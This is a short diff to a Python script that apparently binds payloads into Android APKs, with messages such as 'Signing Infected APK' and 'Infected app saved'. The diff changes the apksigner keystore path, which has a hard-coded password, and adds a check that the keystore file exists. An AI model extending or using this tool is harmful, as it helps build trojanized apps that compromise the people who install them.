@@ -284,7 +284,7 @@ def Bind():
 		subprocess.call(mv + ' '+ str(sys.argv[3]) + ' ..',shell=True)
 		os.chdir('../')
 		print(CYAN + '[+] Signing Infected APK...\n' + WHITE)
-		subprocess.call("apksigner sign --ks keystore/release.keystore --ks-pass pass:lmaolmfao %s" % (str(sys.argv[3])),shell=True)
+		subprocess.call("apksigner sign --ks release.keystore --ks-pass pass:lmaolmfao %s" % (str(sys.argv[3])),shell=True)
 		print ( GREEN + "\nInfected app saved :  " + YELLOW + " %s (%s bytes)" % (str(sys.argv[3]),str(os.path.getsize(str(sys.argv[3])))) + WHITE)	
 		subprocess.call(rm + " TempP",shell=True)
 		exit()
@@ -360,4 +360,8 @@ sleep(1)
 if os.path.exists("/data/data/com.termux/files/home"):
 	print(RED + "WARNING: " + BLUE + "APKTool may not run properly on Termux\n\n" + WHITE)
 
-main()
+if not os.path.isfile("release.keystore"):
+	print(RED + "\nERROR: keystore file not found. EXITING..." + WHITE)
+	exit()
+else:
+	main()
